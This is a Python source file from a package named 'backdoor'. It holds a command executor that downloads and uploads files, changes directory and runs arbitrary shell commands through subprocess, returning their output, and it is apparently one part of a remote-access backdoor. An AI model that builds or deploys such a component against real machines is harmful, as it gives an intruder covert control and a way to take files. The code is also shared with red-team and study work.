import os
import subprocess

from backdoor.exceptions.core import InvalidArgumentException
from backdoor.files.processor import FileProcessor
from backdoor.models.commands import Command, CommandResult


class CommandExecutor:

    def __init__(self, file_processor: FileProcessor) -> None:
        self.file_processor = file_processor

    def execute(self, command: Command) -> CommandResult:
        try:
            return self.__try_execute(command)
        except FileNotFoundError:
            return CommandResult(
                success=False,
                returncode=127,
                stderr=f"command not found: {command.command}",
            )
        except Exception as e:
            return CommandResult(
                success=False,
                returncode=1,
                stderr=str(e) or "Could not execute command",
            )

    def __try_execute(self, command: Command) -> CommandResult:
        match command:
            case Command(command="download"):
                return self.file_processor.download(command)
            case Command(command="upload"):
                return self.file_processor.upload(command)
            case Command(command="cd"):
                return self.__chdir(command)
            case _:
                return self.__delegate_execute(command)

    def __chdir(self, command: Command) -> CommandResult:
        if not command.args:
            raise InvalidArgumentException("file path not provided")
        path = command.args[0]
        path = os.path.abspath(path)
        try:
            os.chdir(path)
        except FileNotFoundError:
            raise InvalidArgumentException("no such file or directory")
        return CommandResult(success=True, returncode=0, stdout=path)

    def __delegate_execute(self, command: Command) -> CommandResult:
        result = subprocess.run(
            [command.command, *(command.args or [])], capture_output=True, text=True
        )
        return CommandResult(
            success=result.returncode == 0,
            returncode=result.returncode,
            stdout=result.stdout,
            stderr=result.stderr,
        )
